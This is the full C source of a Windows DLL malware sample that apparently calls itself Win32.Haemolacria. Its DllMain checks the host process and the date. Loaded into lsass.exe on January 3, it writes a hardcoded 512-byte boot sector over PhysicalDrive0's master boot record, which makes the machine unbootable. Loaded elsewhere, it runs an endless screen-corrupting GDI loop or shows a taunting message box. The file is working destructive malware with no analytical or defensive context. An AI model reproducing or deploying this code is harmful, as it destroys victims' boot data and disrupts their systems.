#include <Windows.h>
#define DLLEXPORT __declspec(dllexport)
DWORD state;
DWORD ThreadCounter = 0;
#define avg(x, y) (x + y) / 2
//i call this one xorshit
DLLEXPORT DWORD rng() {
	state ^= state >> 7;
	HDC dc = GetDC(NULL);
	state ^= (DWORD)dc * 11;
	ReleaseDC(NULL, dc);
	return state;
}

DLLEXPORT VOID WINAPI sneaky() {
	MessageBoxW(NULL, L"secret level unlocked", L"oop", MB_ICONEXCLAMATION);
}

DLLEXPORT VOID WINAPI WhoAreYou() {
	MessageBoxW(NULL, L"I'm your dream, make you real. I'm your eyes when you must steal. I'm your pain when you can't feel. Sad but true. I'm your dream, mind astray. I'm your eyes while you're away. I'm your pain while you repay. You know it's sad but true \n -_Win32.Haemolacria by NullException_-", L"Haemolacria", MB_ICONERROR);
}


DLLEXPORT VOID WINAPI DestructivePayloadLSASS() {
	DWORD dwWank;
	static const BYTE lpMBR[] = { 0x31, 0xC0, 0xCD, 0x1A, 0x31, 0xD1, 0x89, 0x0E, 0x2B, 0x7D, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xB8,
0x02, 0x00, 0xCD, 0x10, 0xBE, 0x2E, 0x7D, 0xAC, 0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10,
0xEB, 0xF5, 0x31, 0xC0, 0xCD, 0x16, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x10, 0x10, 0xBB, 0x10,
0x00, 0xB9, 0x00, 0x00, 0xBA, 0x3F, 0x3F, 0xCD, 0x10, 0xB8, 0x10, 0x10, 0xBB, 0x00, 0x00, 0xB9,
0x00, 0x00, 0xB6, 0x00, 0xE8, 0xD7, 0x00, 0xCD, 0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86,
0xF2, 0x80, 0x3E, 0x2D, 0x7D, 0x00, 0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D, 0x08, 0xEB,
0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75, 0x04, 0xF6, 0x16, 0x2D, 0x7D, 0xCD, 0x10, 0x86, 0xF2, 0xBB,
0x00, 0x00, 0x59, 0x80, 0xF9, 0x3F, 0x7D, 0x04, 0xFE, 0xC1, 0xEB, 0xC8, 0x80, 0xFD, 0x3F, 0x7D,
0x04, 0xFE, 0xC5, 0xEB, 0xBF, 0x80, 0xFE, 0x3F, 0x7D, 0x04, 0xFE, 0xC6, 0xEB, 0xB6, 0xE8, 0x8D,
0x00, 0xCD, 0x10, 0x51, 0x31, 0xC9, 0xBB, 0x10, 0x00, 0x86, 0xF2, 0x80, 0x3E, 0x2D, 0x7D, 0x00,
0x74, 0x09, 0xFE, 0xC6, 0x80, 0xFE, 0x3F, 0x7D, 0x08, 0xEB, 0x0A, 0xFE, 0xCE, 0x08, 0xF6, 0x75,
0x04, 0xF6, 0x16, 0x2D, 0x7D, 0xCD, 0x10, 0x86, 0xF2, 0xBB, 0x00, 0x00, 0x59, 0x08, 0xC9, 0x74,
0x04, 0xFE, 0xC9, 0xEB, 0xC9, 0x08, 0xED, 0x74, 0x04, 0xFE, 0xCD, 0xEB, 0xC1, 0x08, 0xF6, 0x74,
0x04, 0xFE, 0xCE, 0xEB, 0xB9, 0xB9, 0xF4, 0x01, 0xE8, 0x1F, 0x00, 0x8B, 0x3E, 0x2B, 0x7D, 0xB2,
0x10, 0x26, 0x88, 0x15, 0x47, 0x26, 0x88, 0x15, 0x81, 0xC7, 0x40, 0x01, 0x26, 0x88, 0x15, 0x4F,
0x26, 0x88, 0x15, 0x49, 0x0F, 0x84, 0x41, 0xFF, 0xEB, 0xDE, 0x53, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1,
0xE3, 0x07, 0x31, 0x1E, 0x2B, 0x7D, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1, 0xEB, 0x09, 0x31, 0x1E, 0x2B,
0x7D, 0x8B, 0x1E, 0x2B, 0x7D, 0xC1, 0xE3, 0x08, 0x31, 0x1E, 0x2B, 0x7D, 0x5B, 0xC3, 0x60, 0xB9,
0x00, 0x00, 0xBA, 0x00, 0x02, 0xB4, 0x86, 0xCD, 0x15, 0x61, 0xC3, 0x00, 0x00, 0x00, 0x59, 0x65,
0x61, 0x72, 0x73, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x63, 0x6F, 0x6D, 0x65, 0x0A, 0x0D, 0x59,
0x65, 0x61, 0x72, 0x73, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x67, 0x6F, 0x0A, 0x0D, 0x4B, 0x69,
0x6E, 0x67, 0x64, 0x6F, 0x6D, 0x73, 0x20, 0x72, 0x69, 0x73, 0x65, 0x20, 0x61, 0x6E, 0x64, 0x20,
0x66, 0x61, 0x6C, 0x6C, 0x0A, 0x0D, 0x54, 0x68, 0x65, 0x20, 0x74, 0x69, 0x6D, 0x65, 0x20, 0x68,
0x61, 0x73, 0x20, 0x63, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x61, 0x6B, 0x65, 0x20,
0x63, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x0A, 0x0D, 0x54, 0x68, 0x65, 0x20, 0x77, 0x6F, 0x72,
0x6C, 0x64, 0x20, 0x62, 0x65, 0x6C, 0x6F, 0x6E, 0x67, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x73,
0x0A, 0x0A, 0x0D, 0x57, 0x69, 0x6E, 0x33, 0x32, 0x2E, 0x48, 0x61, 0x65, 0x6D, 0x6F, 0x6C, 0x61,
0x63, 0x72, 0x69, 0x61, 0x20, 0x62, 0x79, 0x20, 0x4E, 0x75, 0x6C, 0x6C, 0x45, 0x78, 0x63, 0x65,
0x70, 0x74, 0x69, 0x6F, 0x6E, 0x0A, 0x0D, 0x0A, 0xB0, 0xB1, 0xB2, 0x50, 0x72, 0x65, 0x73, 0x73,
0x20, 0x61, 0x6E, 0x79, 0x20, 0x6B, 0x65, 0x79, 0xB2, 0xB1, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
	SetLastError(0);
	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dwError = GetLastError();
	WriteFile(hDisk, lpMBR, 512, &dwWank, NULL);
	Sleep(200);
	ExitProcess(dwError);
}


//
DLLEXPORT VOID WINAPI Xormelt() {
	
	//WAVEFORMATEX waveformat = *(LPWAVEFORMATEX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(waveformat));
	//waveformat.wFormatTag = WAVE_FORMAT_PCM;
	//waveformat.nChannels = 1;
	//waveformat.nSamplesPerSec = 8000;
	//waveformat.nBlockAlign = 2;
	//waveformat.wBitsPerSample = 16;
	//waveformat.nAvgBytesPerSec = waveformat.nSamplesPerSec * waveformat.nBlockAlign;
	//waveformat.cbSize = 0;
	//HANDLE hWaveout;
	//waveOutOpen(&hWaveout, WAVE_MAPPER, &waveformat, NULL, NULL, CALLBACK_NULL);
	//LPWORD Waveform = HeapAlloc(GetProcessHeap(), 0, 44100);
	//DWORD dwRand;
	//MessageBoxW(NULL, L"Waveformat", L"Shit", 0);
	//WAVEHDR waveheader = *(LPWAVEHDR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WAVEHDR));
	//waveheader.dwBufferLength = 44100;
	//waveheader.dwBytesRecorded = 0;
	//waveheader.dwUser = 0;
	//waveheader.lpData = Waveform;
	//waveheader.lpNext = waveheader.reserved = 0;
	//waveheader.dwFlags = WHDR_BEGINLOOP | WHDR_ENDLOOP;
	//waveheader.dwLoops = 1;
	//waveOutPrepareHeader(hWaveout, &waveheader, sizeof(WAVEHDR));
	//dwRand = rng();
	//MessageBoxW(NULL, L"Waveheader", L"Shit", 0);
	//	for (DWORD i = 0; i < 22050; i++)
	//		Waveform[i] = avg(i % (1 + dwRand % 255) << 8, (i % 5) << 8) | rng() >> 24;
	//	for (DWORD i = 22050; i < 44100; i++)
	//		Waveform[i] = 0xFFFF >> 16 - (i % 16);
	//	MessageBoxW(NULL, L"Waveform", L"Shit", 0);
	//DWORD dwSwitch = 0;
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;
	//BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
	//StretchBlt(hScreen, scRect.left, scRect.top, scRect.right / 3, scRect.bottom / 3, hScreen, scRect.left, scRect.top, scRect.right / 2, scRect.bottom / 2, SRCCOPY);
	//StretchBlt(hScreen, (scRect.right / 3) * 2, (scRect.bottom / 3) * 2, scRect.right, scRect.bottom, hScreen, scRect.right / 2, scRect.bottom / 2, scRect.right, scRect.bottom, SRCCOPY);
	for (DWORD i = 0; i <= 20; i++) {
		HDC hDC = GetDC(NULL);
		BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);
		if (i >= 5) BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCAND);
		if (i >= 10) {
			dwSmegma = rng() % (scRect.right > scRect.bottom ? scRect.right : scRect.bottom);
			StretchBlt(hDC, 1 + dwSmegma % scRect.right, 1 + dwSmegma % scRect.bottom, scRect.right - dwSmegma % scRect.right, dwSmegma % scRect.bottom, hDC, 1, 1, scRect.right, scRect.bottom, SRCAND);
		}
		if (i >= 15) BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCPAINT);
		if (i == 20) {
			for (DWORD i = 0; i < (scRect.right > scRect.bottom ? scRect.right : scRect.bottom); i++){
				HDC hDCPen = GetStockObject(DC_PEN), hDCBrush = GetStockObject(DC_BRUSH);
				SetDCPenColor(hDCPen, rng() % 0x00FFFF00);
				SetDCBrushColor(hDCBrush, rng() % 0x00FFFF00);
				if (i % 20 == 0) Ellipse(hDC, rng() % scRect.right, rng() % scRect.bottom, rng() % scRect.right, rng() % scRect.bottom);
				if (i % 100 == 0) BitBlt(hDC, 1, 1, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), hDC, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), SRCINVERT);
				MoveToEx(hDC, rng() % scRect.right, rng() % scRect.bottom, NULL);
				SetDCPenColor(hDCPen, rng() % 0x00FFFF00);
				LineTo(hDC, rng() % scRect.right, rng() % scRect.bottom);
				HBRUSH hBrush = CreateSolidBrush(rng() & 0x00FFFF00);
				RectangleR.left = i % scRect.right;
				RectangleR.top = i % scRect.bottom;
				RectangleR.bottom = RectangleR.top + rng() % 100;
				RectangleR.right = RectangleR.left + rng() % 100;
				FillRect(hDC, &RectangleR, hBrush);
				DeleteObject(hBrush);
				Sleep(10);
			}

		}
		Sleep(1000);
	}
	for (;;) {

		//waveOutWrite(hWaveout, &waveheader, sizeof(WAVEHDR));
		//dwSwitch = ~dwSwitch;
		hScreen = GetDC(NULL);
		DWORD dwRannum = rng();
		dwCTR++;
		if (dwCTR == 4) {
			StretchBlt(hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, hScreen, scRect.left + ((dwRannum % 32) + 4), scRect.top + ((dwRannum % 32) + 4), scRect.right - ((dwRannum % 32) + 4), scRect.bottom - ((dwRannum % 32) + 4), SRCINVERT);
			StretchBlt(hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, hScreen, scRect.left + ((dwRannum % 32) + 4), scRect.top + ((dwRannum % 32) + 4), scRect.right - ((dwRannum % 32) + 4), scRect.bottom - ((dwRannum % 32) + 4), SRCPAINT);
			BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
			dwCTR = 0;
		}
		StretchBlt(hScreen, scRect.left + 50 + (dwRannum % 400) / 2, scRect.top + 50 + (dwRannum % 400) / 2, scRect.right - 100 - (dwRannum % 400), scRect.bottom - 100 - (dwRannum % 400), hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, SRCCOPY);
		ReleaseDC(NULL, hScreen);
		Sleep(50);
	}
}

DWORD WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpReserved) {
	
	DWORD AlwaysLSASS = 0;
	DWORD AlwaysEXPLORER = 0;
	DWORD AlwaysJanuary3 = 0;
	//a
	SetLastError(0);
	WCHAR* lpProcPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
	LPCWSTR lpProcname;
	GetModuleFileNameW(NULL, lpProcPath, MAX_PATH);
	for (INT i = MAX_PATH-1; i > 0; i--) 
		if (lpProcPath[i] == L'\\') {
			lpProcname = (DWORD)lpProcPath + 2 * ++i;
			break;
		}	
	if (dwReason == DLL_PROCESS_ATTACH || dwReason == DLL_THREAD_ATTACH) {
		SYSTEMTIME systime;
		GetSystemTime(&systime);
		if (!lstrcmpW(lpProcname, L"lsass.exe") || (AlwaysLSASS && !AlwaysEXPLORER)) {			
			if (systime.wDay == 3 && systime.wMonth == 1 || AlwaysJanuary3){
				DestructivePayloadLSASS();
			}
		}
		//else if (!lstrcmpW(lpProcname, L"explorer.exe") || AlwaysEXPLORER && !AlwaysLSASS) {
		else {
			if (systime.wDay == 3 && systime.wMonth == 1 || AlwaysJanuary3){
				WhoAreYou();
			}
			else {
				Xormelt();
			}
		}		
		//else return 1;
	}
	return 1;
}